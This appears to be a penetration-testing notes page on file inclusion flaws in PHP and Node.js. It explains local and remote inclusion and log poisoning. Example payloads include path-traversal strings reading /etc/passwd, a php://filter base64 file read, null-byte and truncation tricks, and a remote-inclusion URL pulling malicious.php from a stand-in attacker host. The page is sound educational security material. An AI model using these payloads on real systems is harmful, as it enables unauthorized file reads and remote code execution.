# File Inclusion

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" %}

File Inclusion allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. Most commonly found in **PHP** applications.&#x20;

For example, think of file inclusion when you see:

* page.php?file=some-file-here
* page.php?language=eng

## PHP Local File Inclusion (LFI)

LFI happens when an attacker can include files on the vulnerable server (as opposed to being able to include files from remote servers). [Path Traversal](path-traversal.md) techniques can often be useful when exploiting local file inclusion vulnerabilities.

For example, let's say you have the page `page.php?language=en` and that page includes the `page.en.php` file. If `language=fr`, then it would include `page.fr.php`.

In that case, you can include the `malicious.php` file in the same directory with `page.php?language=en/../malicious`. If you had for example managed to upload a `malicious.php` file using [unrestricted file upload](page-3.md), then that will result in an RCE vulnerability.

### Log Poisoning

If you are unable to upload PHP files to the website, you might be able to poison log files with PHP code, and then include those logs.

### Data Exfiltration

LFI can be used to read files and get information from the vulnerable system.

#### Reading Files in Base64 Using php://

If the include statement doesn't include a prefix, and only includes your input, then you can use the `php://` filter to convert files to base64 and therefore read them without issues.

[http://127.0.0.1/fileinclude.php?lang=php://filter/convert.base64-encode/resource=hello.php\
](http://127.0.0.1/fileinclude.php?lang=php://filter/convert.base64-encode/resource=hello.php)

#### Reading /proc

You can try to glean information by reading `/proc`. For example:

* `/proc/self/fd` files
* `/proc/sched_debug`

### Bypass Tricks

For tricks to bypass file extensions and filters, you can take a look at the [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-data) repository, but note that practically all the methods there have certain limitations and caveats that aren't mentioned.&#x20;

#### **NULL Byte Trick**

Putting a null-byte in between a string _might_ terminate the string in PHP (NULL is the string terminator in C). For example, `include("shell.php\0.img")` will try to include `shell.php`.&#x20;

In URL encoding, the NULL byte is `%00`.&#x20;

**WARNING:** Doesn't work since PHP 5.3.4 (though `preg_` functions should still be vulnerable). If you try to do it after PHP 5.3.4, then it simply won't open anything with a null byte in it. Error message:&#x20;

```
Failed opening 'http://www.example.com' for inclusion, when the url is ?lang=http://www.example.com%00.whatever
```

#### **Truncation Trick**

On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.

That truncation, combined with the fact that `/etc/passwd` can **sometimes** be the same as `/etc/passwd/`in PHP, means that you might be able to throw away excess characters (such as a file extension you don't want)

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
```

**WARNING:** There were multiple issues with this when testing locally on Apache2:

1. Including `/etc/passwd/` didn't work, even when `/etc/passwd` did.
2. To try to work around issue #1, I tried to put the `/etc/passwd.ext` at the end. However, I was not able to get it to work with the `.ext` at the end (it worked without it). Just to make sure, I tried to brute force cutoff points up to 99999 character (unsuccessfully).

## PHP Remote File Inclusion

Is when you can include a remote file, for example a file you're hosting. Example payload:

```
page.php?include=http://malicious.com/malicious.php?
```

Tip: The `?` at the end is useful, since if the application adds a suffix to the request, then that will simply be interpreted as a GET parameter, and your malicious file will be successfully included regardless.

## Node.js LFI

If a `require()` is at the top of a file, then it’s loaded into memory at the start of the application’s life. However, if it’s in the middle of a function, then it’s loaded every time that function is run.&#x20;

So if:&#x20;

1. You have arbitrary file upload and you can upload a javascript file
2. You control which file is loaded&#x20;

Then you can cause the application to load your file and get RCE. Admittedly, this is an **extremely unusual circumstance**.

